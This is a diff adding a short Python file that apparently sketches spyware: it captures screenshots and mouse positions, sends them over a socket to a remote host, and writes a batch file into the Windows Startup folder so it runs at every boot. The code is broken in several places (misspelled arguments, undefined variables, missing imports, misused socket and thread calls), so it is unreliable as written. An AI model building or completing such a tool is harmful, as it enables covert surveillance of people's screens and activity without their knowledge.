@@ -1,0 +1,39 @@
+from pynput import *
+from pyautogui import *
+from socket import *
+from threading import *
+import getpass
+
+#define 
+
+USER_NAME = getpass.getuser() # to startup
+s = socket
+lmouse =Listener()        #mouse listener 
+cmouse = Controller()       #mouse controller
+shot = pyautogui.screenshot()     #screenshot (img)
+sock = Thread(target = sockshot)    # thread send screen (capture)
+detect = Thread (taget = mousedet)   # thread send mouse position
+
+#socket
+def mousedet (host,port) :
+    s.connect(host,port)
+    s.sendall(data)
+    
+def sockshot(host,port):
+    s.connect(host,port)
+    s.sendall(shot)
+#thread control
+
+def threads ():
+    sock.start()
+    sockshot.start()
+    
+
+# startup when turned on
+
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" %s' % file_path)
